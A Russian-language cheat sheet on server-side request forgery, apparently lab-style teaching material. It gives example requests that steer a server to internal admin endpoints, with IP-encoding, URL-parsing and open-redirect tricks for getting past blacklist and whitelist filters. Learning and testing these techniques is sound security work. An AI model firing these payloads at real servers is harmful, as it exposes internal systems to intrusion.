SSRF - это уязвимость, эксплуатируя которую, злоумышленник может заставить сервер отправить запрос на произвольный адрес. То есть отправить его запрос от имени сервера.

## Типичная SSRF для сервисов на самом сайте
Оригинальный запрос:
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://example.com:8080/product/stock/check?productId=6&storeId=1
```

Редактированный запрос:
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://example.com/admin&storeId=1
```

## Типичная SSRF против внутренних хостов
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin
```

## Обход black-listed фильтров SSRF
```
stockApi=http://127.1/admin
stockApi=http://017700000001/admin
stockApi=http://2130706433/admin
```
Регистрация своего доменного имени, который резолвит 127.0.0.1:
```
spoofed.burpcollaborator.net
```
Также для обхода фильтров можно использовать URL-энкодинг и смену регистра.

## Обход white-listed фильтров SSRF
Некоторые веб-приложения разрешают только ввод, который начинается или содержит, значения из вайтлиста или разрешенные значения.
В этом случае можно обойти фильтр, используя несоответствия при синтаксическом анализе URL.
Спецификация URL-адреса содержит ряд функций, которые могут быть упущены из виду при реализации специального синтаксического анализа и проверки URL-адресов.
- Вы можете вставить учетные данные в URL-адрес перед именем хоста, используя символ @:
```
https://example.com@evil-host
```
-  Вы можете использовать символ # для обозначения фрагмента URL:
```
https://example.com#expected-host
```
- Вы можете использовать иерархию DNS-имен, чтобы поместить необходимые входные данные в полностью определенное DNS-имя, которое вы контролируете:
```
https://example.com.evil-host
```

## Обход фильтров SSRF с помощью открытых редиректов
Например, если приложение содержит открытый редирект в данной URL:
’’’
/product/nextProduct?currentProductId=6&path=http://evil-user.net
’’’
То оно перенаправит на:
```
http://evil-user.net
```

Можно использовать уязвимость Open Redirect, чтобы обойти URL-фильтр и заэксплуатировать SSRF:
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://example.com/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```
